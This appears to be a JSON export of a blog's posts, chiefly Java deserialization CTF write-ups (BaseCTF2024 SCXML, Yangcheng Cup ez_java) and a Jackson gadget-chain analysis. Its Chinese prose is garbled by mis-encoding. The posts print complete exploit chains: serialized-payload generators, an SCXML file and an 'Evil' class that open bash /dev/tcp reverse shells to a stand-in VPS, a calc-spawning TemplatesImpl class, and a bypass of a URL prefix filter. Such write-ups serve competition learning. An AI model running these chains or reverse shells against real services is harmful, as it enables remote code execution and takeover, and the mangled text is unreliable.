{"meta":{"title":"Narcherã®å°çª","subtitle":"","description":"","author":"Narcher Alter","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"BaseCTF2024_JAVAé¢˜è§£(ä¸€è¡€)","slug":"BaseCTF2024_JAVAé¢˜è§£(ä¸€è¡€)","date":"2024-09-15T13:07:42.752Z","updated":"2024-09-15T13:11:25.430Z","comments":true,"path":"2024/09/15/BaseCTF2024_JAVAé¢˜è§£(ä¸€è¡€)/","link":"","permalink":"http://example.com/2024/09/15/BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;9&#x2F;13 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;9&#x2F;13 åˆ†ç±»ï¼šwriteup [Fin] scxmlå‰è¨€ çœ‹è§æœ‰javaé¢˜æ²¡äººåšï¼Œäºæ˜¯ä¾¿åšäº†åšï¼Œæ„Ÿè§‰è¿˜è¡Œï¼Œç›´åˆ°æ¯”èµ›ç»“æŸåªæœ‰ä¸‰è§£ æ­£æ–‡N1å¸ˆå‚…çš„é¢˜ï¼Œéš¾åº¦åˆšåˆšå¥½ å…ˆä¸‹è½½é™„ä»¶çœ‹çœ‹ï¼š æœ‰ä¸€ä¸ªè‡ªå®šä¹‰çš„åŒ…n1ght.jarï¼Œæ‰“å¼€åˆ†æä¸€ä¸‹ï¼š è‡ªå®šä¹‰å†™äº†ä¸ªç±»ï¼Œå¹¶å«æœ‰toStringæ–¹æ³•ï¼Œå†çœ‹çœ‹Mainï¼š 12345678910111213141516171819202122232425262728293031323334import com.sun.net.httpserver.HttpServer;import javax.naming.InitialContext;import java.io.IOException;public class Main &#123; public static void main(String[] args) throws IOException &#123; var port = Integer.parseInt(System.getenv().getOrDefault(&quot;PORT&quot;, &quot;8000&quot;)); var server = HttpServer.create(new java.net.InetSocketAddress(port), 0); server.createContext(&quot;/&quot;, req -&gt; &#123; var code = 200; var response = switch (req.getRequestURI().getPath()) &#123; case &quot;/scxml&quot; -&gt; &#123; try &#123; var param = req.getRequestURI().getQuery(); yield new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(param))).readObject().toString(); &#125; catch (Throwable e) &#123; e.printStackTrace(); yield &quot;:(&quot;; &#125; &#125; default -&gt; &#123; code = 404; yield &quot;Not found&quot;; &#125; &#125;; req.sendResponseHeaders(code, 0); var os = req.getResponseBody(); os.write(response.getBytes()); os.close(); &#125;); server.start(); System.out.printf(&quot;Server listening on :%s\\n&quot;, port); &#125;&#125; å‘ç°åœ¨&#x2F;scxmlè·¯ç”±ä¸‹å¯¹æŸ¥è¯¢çš„å‚æ•°è¿›è¡Œäº†Base64è§£å¯†ï¼Œå¹¶åœ¨ååºåˆ—åŒ–åæ‰§è¡Œäº†toStringæ–¹æ³•ï¼Œå†è”æƒ³åˆ°ä¸Šè¾¹é‚£ä¸ªè‡ªå®šä¹‰åŒ…é‡Œçš„ç±»ï¼Œå…«æˆæ˜¯ç”¨é‚£ä¸ªInvokerImplç±»ä½œä¸ºå…¥å£ç‚¹ï¼Œå†ç»“åˆä¸‹è¾¹çš„ä¾èµ–ä»¥åŠé¢˜ç›®åå­—ï¼Œä¸éš¾æƒ³åˆ°scxmlçš„RCEæ¼æ´ï¼šApache SCXML2 RCEæ¼æ´_scxml scxmlexecutor-CSDNåšå®¢ å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜æ˜¯å›åˆ°ä¸Šè¾¹ç»§ç»­è·Ÿé¢˜ç›®æ¥ï¼š InvokerImplçš„æ„é€ å™¨è¦æ±‚ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªInvokeræœ‰ç‚¹å¯ç–‘ï¼Œç‚¹è¿›å»çœ‹çœ‹ï¼š å‘ç°æ˜¯ä¸ªæ¥å£ï¼Œé‚£ä¹ˆæˆ‘ä»¬å»æ‰¾æ‰¾å®ƒçš„å®ç°ç±»ï¼Œç»“æœå‘ç°åªæœ‰ä¸€ä¸ªSimpleSCXMLInvokerç±»ï¼Œç»“åˆä¸Šè¾¹è´´å‡ºæ¥çš„é‚£ä¸ªæ¼æ´ï¼Œæ‰“å°±å®Œäº† å› ä¸ºInvokerImplè§¦å‘çš„æ˜¯SimpleSCXMLInvokerç±»çš„invokeæ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738public void invoke(String source, Map&lt;String, Object&gt; params) throws InvokerException &#123; SCXML scxml = null; try &#123; scxml = SCXMLReader.read(new URL(source)); &#125; catch (ModelException var9) &#123; throw new InvokerException(var9.getMessage(), var9.getCause()); &#125; catch (IOException var10) &#123; throw new InvokerException(var10.getMessage(), var10.getCause()); &#125; catch (XMLStreamException var11) &#123; throw new InvokerException(var11.getMessage(), var11.getCause()); &#125; Evaluator eval = this.parentSCInstance.getEvaluator(); this.executor = new SCXMLExecutor(eval, new SimpleDispatcher(), new SimpleErrorReporter()); Context rootCtx = eval.newContext((Context)null); Iterator var6 = params.entrySet().iterator(); while(var6.hasNext()) &#123; Map.Entry&lt;String, Object&gt; entry = (Map.Entry)var6.next(); rootCtx.setLocal((String)entry.getKey(), entry.getValue()); &#125; this.executor.setRootContext(rootCtx); this.executor.setStateMachine(scxml); this.executor.addListener(scxml, new SimpleSCXMLListener()); this.executor.registerInvokerClass(&quot;scxml&quot;, this.getClass()); try &#123; this.executor.go(); &#125; catch (ModelException var8) &#123; throw new InvokerException(var8.getMessage(), var8.getCause()); &#125; if (this.executor.getCurrentStatus().isFinal()) &#123; TriggerEvent te = new TriggerEvent(this.eventPrefix + invokeDone, 3); (new AsyncTrigger(this.parentSCInstance.getExecutor(), te)).start(); &#125;&#125; å¾ˆç®€å•çš„é€»è¾‘ï¼Œå¯¹æˆ‘ä»¬ä¼ å…¥çš„sourceè¿›è¡ŒURLæŸ¥è¯¢åï¼Œè§£ææ‰€å¾—çš„xmlæ–‡ä»¶å¹¶æ‰§è¡Œï¼Œå…¶å®åˆ°this.executor.go();å°±ç»“æŸäº†ï¼Œä¹‹åæ³¨æ„ä¸€ä¸‹å‰è¾¹è°ƒç”¨åˆ°çš„å‚æ•°éƒ½ä¸€ä¸€ä¼ å‚é¿å…åœ¨å‰è¾¹æŠ¥é”™å°±å¥½äº†ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243import com.n1ght.InvokerImpl;import org.apache.commons.scxml2.SCInstance;import org.apache.commons.scxml2.SCXMLExecutor;import org.apache.commons.scxml2.env.SimpleContext;import org.apache.commons.scxml2.env.SimpleErrorReporter;import org.apache.commons.scxml2.env.jexl.JexlEvaluator;import org.apache.commons.scxml2.invoke.SimpleSCXMLInvoker;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class Test &#123; public static void main(String[] args) throws Exception &#123; SCXMLExecutor executor = new SCXMLExecutor(); executor.setRootContext(new SimpleContext()); executor.setEvaluator(new JexlEvaluator()); executor.setErrorReporter(new SimpleErrorReporter()); Class c = Class.forName(&quot;org.apache.commons.scxml2.SCInstance&quot;); Constructor constructor = c.getDeclaredConstructor(SCXMLExecutor.class); constructor.setAccessible(true); SCInstance scInstance = (SCInstance) constructor.newInstance(executor); setValue(scInstance,&quot;evaluator&quot;, new JexlEvaluator()); SimpleSCXMLInvoker simpleSCXMLInvoker = new SimpleSCXMLInvoker(); simpleSCXMLInvoker.setSCInstance(scInstance); Map&lt;String, Object&gt; params = new HashMap&lt;&gt;(); params.put(&quot;Narcher&quot;,&quot;Alter&quot;); InvokerImpl invoker = new InvokerImpl(simpleSCXMLInvoker,&quot;http://1.1.1.1:6666/scxml2.xml&quot;,params);//vpsåœ°å€ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(invoker); oos.close(); System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray()))); &#125; public static void setValue(Object obj,String name,Object value)throws Exception &#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125;&#125; å…¶ä¸­scxml2.xmlå†…å®¹å¦‚ä¸‹ï¼ˆè®°å¾—è‡ªå·±æ”¹vpsåœ°å€ï¼‰ï¼š 12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt; &lt;state id=&quot;run&quot;&gt; &lt;onentry&gt; &lt;script&gt; &#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzc3NzcgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;) &lt;/script&gt; &lt;/onentry&gt; &lt;/state&gt;&lt;/scxml&gt; ä¹‹åç”¨æˆ‘ä¸Šè¾¹çš„é“¾å­æ‰“å°±å®Œäº†ï¼ˆè®°å¾—urlç¼–ç ï¼‰ï¼Œä¸‹é¢é™„ä¸Šå›¾ï¼š æˆåŠŸåå¼¹shellå¹¶å‘½ä»¤æ‰§è¡Œè·å¾—flag å°ç»“æœ¬é¢˜çš„éš¾åº¦åœ¨äºç½‘ä¸Šæ²¡æœ‰ç°æˆçš„payloadï¼Œä»å¤´è‡ªå·±æ‰¾ä¸€æ¡é“¾å­å¯¹äºå¤§å¤šæ•°è„šæœ¬å°å­æ¥è¯´å¯èƒ½æœ‰äº›éš¾åº¦ï¼Œå…¶æ¬¡å°±æ˜¯æ²¡æ³¨æ„åˆ°åº”è¯¥æŠŠé“¾å­æ”¾åœ¨ä¼ å‚çš„keyä¸Šæˆ–è€…æ˜¯åœ¨è‡ªå·±æ„é€ é“¾å­çš„æ—¶å€™å„ç§åœ°æ–¹æ¼äº†èµ‹å€¼ç­‰ç­‰ï¼Œé¢˜ç›®æ€»çš„æ¥è¯´è¿˜æŒºå¥½ç©çš„ æœ€åè´´ä¸Šä¸€è¡€ï¼š","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:Jacksoné“¾ï¼ˆæœªå®Œå¾…ç»­ï¼‰","slug":"JAVAå®‰å…¨Jacksoné“¾","date":"2024-08-30T03:18:25.970Z","updated":"2024-09-15T13:12:02.539Z","comments":true,"path":"2024/08/30/JAVAå®‰å…¨Jacksoné“¾/","link":"","permalink":"http://example.com/2024/08/30/JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;8&#x2F;30 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;8&#x2F;30 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€ä»ç½‘ä¸Šçœ‹äº†å‡ ç¯‡æ–‡ç« ï¼Œè®²çš„éƒ½æŒºå¥½çš„ï¼Œå°±å†™ä¸€ç¯‡åšä¸ªæ€»ç»“å§ æ­£æ–‡Spring-JacksonåŸç”Ÿé“¾è¿™æ¡é“¾å­æ˜¯23å¹´é˜¿é‡Œäº‘CTF bypassit1çˆ†å‡ºæ¥çš„ åŸºæœ¬ä¸Šä¾èµ–éƒ½æ˜¯springbootè‡ªå¸¦çš„ï¼Œç¡¬è¦è‡ªå·±åŠ çš„è¯å°±åŠ ä¸‹è¾¹è¿™ä¸ªï¼š 12345&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.13.5&lt;/version&gt;&lt;/dependency&gt; æˆ‘ä»¬åœ¨æ­£å¸¸è°ƒç”¨jacksonè¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨åºåˆ—åŒ–å¯¹è±¡ç±»çš„getteræ–¹æ³• 1234567891011121314151617package jacksonimport com.fasterxml.jackson.core.JsonProcessingException;import com.fasterxml.jackson.databind.ObjectMapper;import jackson.bean.User;public class Test &#123; public static void main(String[] args) throws JsonProcessingException &#123; User user = new User(); System.out.println(user); ObjectMapper mapper = new ObjectMapper();// mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); String jsonData = mapper.writeValueAsString(user); System.out.println(jsonData);// User user1 = mapper.readValue(jsonData,User.class);// System.out.println(user1); &#125;&#125; å…¶ä¸­Userç±»å†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536package jackson.bean;import java.util.Map;public class User &#123; private String name; private String age; public User() &#123; System.out.println(&quot;ç©ºæ„é€ å™¨&quot;); &#125; public Map getGift() &#123; System.out.println(&quot;getGift&quot;); return null; &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public String getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; public void setAge(String age) &#123; System.out.println(&quot;setAge&quot;); this.age = age; &#125;&#125; è¾“å‡ºå¦‚ä¸‹ï¼š ç»è¿‡è°ƒè¯•å¯ä»¥å‘ç°æ˜¯writeValueAsStringæ–¹æ³•è§¦å‘çš„ï¼š è€Œåœ¨jacksonçš„åº“ä¸­æœ‰ä¸€ä¸ªArrayNodeç±»ï¼Œç”¨äºè¡¨ç¤ºjsonæ•°ç»„ï¼Œå¹¶ä¸”ç»§æ‰¿äº†BaseJsonNodeç±»ï¼Œè€Œåœ¨BaseJsonNodeç±»é‡Œå¯¹toStringæ–¹æ³•è¿›è¡Œäº†é‡å†™ï¼š ç›¸å½“äºè°ƒç”¨toStringæ–¹æ³•å°±å¯ä»¥å¯¼è‡´ä»»æ„getterçš„è§¦å‘ å¯¹äºå¯ä»¥åˆ©ç”¨çš„getterè¿™é‡Œï¼Œä¸éš¾æƒ³åˆ°æœ€å¸¸è§çš„TemplatesImplç±»çš„getOutputPropertiesæ–¹æ³• é‚£ä¹ˆæŠŠå°è£…å¥½çš„TemplatesImplç±»æ”¾åˆ°ArrayNodeé‡Œï¼Œç„¶åå†æ‰¾ä¸€ä¸ªèƒ½å¤Ÿè§¦å‘toStringæ–¹æ³•ä¸”åŒ…å«readObjectæ–¹æ³•çš„ç±»å°±ç»“æŸäº† è€Œåœ¨BadAttributeValueExpExceptionçš„readObjectæ–¹æ³•ä¸­ï¼Œåˆ™æ°å¥½æœ‰å¯¹toStringæ–¹æ³•çš„è°ƒç”¨ï¼š åœ¨å­¦ä¹ CCé“¾çš„æ—¶å€™æˆ‘ä»¬å°±è§è¿‡äº†ï¼Œæ‰€ä»¥è¯´ç›´æ¥ç”¨åå°„æŠŠvalèµ‹å€¼æˆArrayNodeå°±å®Œå·¥äº† ä½†å¦‚æœè¿™æ ·ç›´æ¥ä¼šå‘ç°åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ ¹æœ¬å¼¹ä¸å‡ºè®¡ç®—å™¨ï¼Œåè€Œæ˜¯åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¼¹å‡ºæ¥ï¼ŒæŠ¥é”™æ˜¾ç¤ºåœ¨åºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨äº†BaseJsonNodeçš„writeReplaceæ–¹æ³•ï¼š è€Œæ ¹æ®åºåˆ—åŒ–çš„è§„åˆ™ï¼šwriteReplaceæ–¹æ³•ä¼šåœ¨åºåˆ—åŒ–çš„æ—¶å€™æ›¿æ¢æ‰åŸæœ‰çš„ç±»å‹ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¸èƒ½æŒ‰æ­£å¸¸çš„é€»è¾‘æ‰“äº† è¿˜å¥½è¿™æ˜¯åºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–ä¹‹å‰æŠŠè¿™ä¸ªæ–¹æ³•ç»™ç§»æ‰ï¼Œå¯ä»¥ç”¨javassistè¿™ä¸ªåº“ ä¹‹åçš„å®Œæ•´é“¾å­å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package jackson;import com.fasterxml.jackson.databind.ObjectMapper;import com.fasterxml.jackson.databind.node.ArrayNode;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class jackson1 &#123; public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NotFoundException, CannotCompileException &#123; TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates,&quot;a&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//evil.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates,codes); Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); ClassPool pool = ClassPool.getDefault(); CtClass ctClass0 = pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;); CtMethod writeReplace = ctClass0.getDeclaredMethod(&quot;writeReplace&quot;); ctClass0.removeMethod(writeReplace); ctClass0.toClass(); ObjectMapper objectMapper = new ObjectMapper(); ArrayNode arrayNode = objectMapper.createArrayNode(); arrayNode.addPOJO(templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(&quot;1&quot;); Field fval = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;); fval.setAccessible(true); fval.set(bad,arrayNode); //åºåˆ—åŒ– ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\jackson1.txt&quot;)); oos.writeObject(bad); //ååºåˆ—åŒ– ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\jackson1.txt&quot;)); ois.readObject(); &#125;&#125; è€Œevilç±»å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class evil extends AbstractTranslet &#123; static &#123; try&#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125;","categories":[],"tags":[]},{"title":"2024ç¾ŠåŸæ¯ez_javaé¢˜è§£","slug":"2024ç¾ŠåŸæ¯ez_javaé¢˜è§£","date":"2024-08-28T06:59:38.527Z","updated":"2024-08-28T11:58:26.425Z","comments":true,"path":"2024/08/28/2024ç¾ŠåŸæ¯ez_javaé¢˜è§£/","link":"","permalink":"http://example.com/2024/08/28/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;8&#x2F;28 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;8&#x2F;28 åˆ†ç±»ï¼šwriteup å‰è¨€é¢˜ç›®æœ¬èº«ä¸éš¾ï¼Œä½†æœ‰å¾ˆå¤šå°ç»†èŠ‚å®¹æ˜“æ²¡æ³¨æ„åˆ°ï¼Œå†™ä¸‹æ¥åšè­¦ç¤ºå§ æ­£æ–‡é¢˜ç›®å¼€å¯åï¼Œé¦–é¡µæ˜¯ä¸ªç™»å½•æ¡†ï¼š ä¸‹è½½ä¸‹æ¥é™„ä»¶ä¹‹ååç¼–è¯‘æ‹¿æºç  æ³¨æ„åˆ°åœ¨configåŒ…ä¸‹æœ‰shiroçš„èº«ä»½éªŒè¯çš„é…ç½® ä¸è¿‡æ²¡å•¥ç”¨ï¼Œå› ä¸ºåœ¨Userç±»é‡Œè¾¹ç»™äº†æˆ‘ä»¬ç”¨æˆ·åå’Œå¯†ç  ç™»å½•è¿›å»ä¹‹åï¼Œä¼šæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼š æˆ‘ä»¬çœ‹ä¸€ä¸‹æºç ï¼š å·®ä¸å¤šå°±æ˜¯é˜²æ­¢ç›´æ¥ä¸Šä¼ jspğŸçš„ï¼Œé™¤äº†è¿™ä¸ªä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªè·¯ç”±æœ‰ç‚¹æ„æ€ï¼š å…¸å‹çš„ååºåˆ—åŒ–ï¼Œä½†è‡ªå®šä¹‰äº†ä¸ªMyObjectInputStreamç±»è¿›è¡Œäº†è¿‡æ»¤ï¼š 1private static final String[] blacklist = new String[]&#123;&quot;java.lang.Runtime&quot;, &quot;java.lang.ProcessBuilder&quot;, &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;java.security.SignedObject&quot;, &quot;com.sun.jndi.ldap.LdapAttribute&quot;, &quot;org.apache.commons.beanutils&quot;, &quot;org.apache.commons.collections&quot;, &quot;javax.management.BadAttributeValueExpException&quot;, &quot;com.sun.org.apache.xpath.internal.objects.XString&quot;&#125;; æˆ‘ä»¬å†å»çœ‹çœ‹ä¾èµ–ï¼š æœ‰CBä¾èµ–ï¼Œjacksonä¾èµ–ç­‰ç­‰ï¼Œå› ä¸ºæœ‰è¿‡æ»¤ï¼Œå‰©ä¸‹èƒ½ç”¨çš„å°±å‰©ä¸ªjacksonä¾èµ–è§¦å‘ä»»æ„getteräº†ï¼Œæˆ‘ä»¬å†å»çœ‹çœ‹Userç±»ï¼š æ°å¥½æœ‰ä¸€ä¸ªèƒ½åˆ©ç”¨çš„getteræ–¹æ³•ï¼Œé‡Œè¾¹æ˜¯ä¼ ç»Ÿçš„URLClassLoaderçš„è¿œç¨‹ç±»åŠ è½½ï¼Œå¯ä»¥åŠ è½½.classæˆ–è€….jaræ–‡ä»¶ï¼›è¿˜æŠŠhttpå’Œfileç»™ç¦ç”¨äº†ï¼Œä½†å®ƒç”¨çš„æ˜¯startsWithç¦ç”¨çš„ï¼Œç»•è¿‡æ–¹å¼æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚åœ¨httpæˆ–è€…fileå¼€å¤´å‰åŠ ä¸ªurl:æˆ–è€…jar:ç­‰ç­‰ ä¾‹å¦‚ï¼šå¯ä»¥ç”¨jar:http://1.1.1.1:8888/evil.jar!/æˆ–è€… url:http://1.1.1.1:8888/evil.jarè¿œç¨‹åŠ è½½jarï¼›ä¹Ÿå¯ç”¨url:http://1.1.1.1:8888/è¿œç¨‹åŠ è½½Evil.class æ¥ä¸‹æ¥è¦å¹²çš„äº‹æƒ…å®é™…ä¸Šå¾ˆæ˜ç¡®äº†ï¼šå†™ä¸€ä¸ªæ¶æ„ç±»ï¼Œç„¶åä¸Šä¼ ä¸Šå»æˆ–è€…æ”¾vpsä¸Šï¼Œç„¶åè¿œç¨‹ç±»åŠ è½½ æ¶æ„ç±»æˆ‘ä»¬å°±è¿™æ ·å†™ï¼š 123456789import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Evil implements Serializable &#123; private void readObject(ObjectInputStream in) throws IOException &#123; Runtime.getRuntime().exec(&quot;bash -c &#123;echo,&lt;bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1çš„base64ç¼–ç &gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;); &#125;&#125; ç„¶åjavac Evil.javaç¼–è¯‘æˆ.classæ–‡ä»¶ç›´æ¥ä¸Šä¼ åˆ°vpsä¸Šï¼Œæˆ–è€…ä½¿ç”¨å‘½ä»¤jar -cvf evil.jar Evil.classæŠŠ.classæ–‡ä»¶å†æ¬¡å‹ç¼©æˆjaråŒ…ï¼Œç„¶åpythonèµ·ä¸€ä¸ªwebæœåŠ¡å°±å¥½äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯è¿œç¨‹ç±»åŠ è½½çš„é“¾å’Œè§¦å‘é“¾äº†ï¼š å› ä¸ºBadAttributeValueExpExceptionè¢«ç¦ç”¨äº†ï¼Œé“¾å­å°±ç”¨jacksoné“¾çš„æ”¹ç¼–ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import com.example.ycbjava.bean.User;import com.example.ycbjava.utils.MyObjectInputStream;import com.fasterxml.jackson.databind.node.POJONode;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import org.springframework.aop.framework.AdvisedSupport;import javax.swing.event.EventListenerList;import javax.swing.undo.CompoundEdit;import javax.swing.undo.UndoManager;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.Base64;import java.util.HashMap;import java.util.Vector;public class jackson &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception &#123; User user = new User(); user.setUsername(&quot;url:http://1.1.1.1:8888/&quot;); //æ³¨æ„æ›´æ”¹vpsåœ°å€ ClassPool pool = ClassPool.getDefault(); CtClass ctClass0 = pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;); CtMethod writeReplace = ctClass0.getDeclaredMethod(&quot;writeReplace&quot;); ctClass0.removeMethod(writeReplace); ctClass0.toClass(); POJONode node = new POJONode(user); EventListenerList eventListenerList = new EventListenerList(); UndoManager undoManager = new UndoManager(); Field editsField = CompoundEdit.class.getDeclaredField(&quot;edits&quot;); editsField.setAccessible(true); Vector vector = (Vector) editsField.get(undoManager); vector.add(node); setValue(eventListenerList,&quot;listenerList&quot;,new Object[]&#123;InternalError.class, undoManager&#125;); HashMap hashMap = new HashMap(); hashMap.put(user,eventListenerList); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize)); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); &#125;&#125; è§¦å‘é“¾å°±ç®€å•äº†ï¼Œå› ä¸ºæ˜¯ååºåˆ—åŒ–è§¦å‘ï¼Œæ‰€ä»¥å¼•ä¸€ä¸‹å°±è¡Œäº†ï¼š 1234567Evil evil = new Evil();ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);objectOutputStream.writeObject(evil);objectOutputStream.close();byte[] serialize = byteArrayOutputStream.toByteArray();System.out.println(Base64.getEncoder().encodeToString(serialize)); ä¹‹åå°±æŒ¨ä¸ªæ‰“å°±å®Œäº† psï¼šè¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„ï¼Œè¿™é“é¢˜ç›®çš„ä¼ å‚æ–¹å¼è™½ç„¶æ˜¯POSTä¼ å‚ï¼Œä½†ä¼ ç»ŸPOSTä¼ å‚è²Œä¼¼åªä¼šæŠ¥errorï¼Œåªèƒ½ç”¨multipart&#x2F;form-dataçš„æ ¼å¼ä¼ å‚ï¼Œè¿™é‡Œä¹Ÿå¡äº†æˆ‘ä¸å°‘æ—¶é—´ï¼Œéœ€è¦æ³¨æ„ä¸€ä¸‹ å°ç»“javaé¢˜çš„ç»†èŠ‚å¾ˆå¤šï¼Œè¦å¤šå¤šæ³¨æ„","categories":[],"tags":[]},{"title":"PolarCTFé¶åœºJAVAé¢˜å…¨è§£ï¼ˆæœªå®Œå¾…ç»­ï¼‰","slug":"PolarCTFé¶åœºJAVAé¢˜å…¨è§£","date":"2024-08-24T13:57:54.028Z","updated":"2024-09-07T13:33:39.658Z","comments":true,"path":"2024/08/24/PolarCTFé¶åœºJAVAé¢˜å…¨è§£/","link":"","permalink":"http://example.com/2024/08/24/PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;8&#x2F;25 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;8&#x2F;25 åˆ†ç±»ï¼šwriteup ezjavaé¢˜ç›®æç¤ºflagåœ¨&#x2F;app&#x2F;flag.txté‡Œï¼Œä¸‹å®Œé™„ä»¶æ‰“å¼€çœ‹ä¸€ä¸‹ 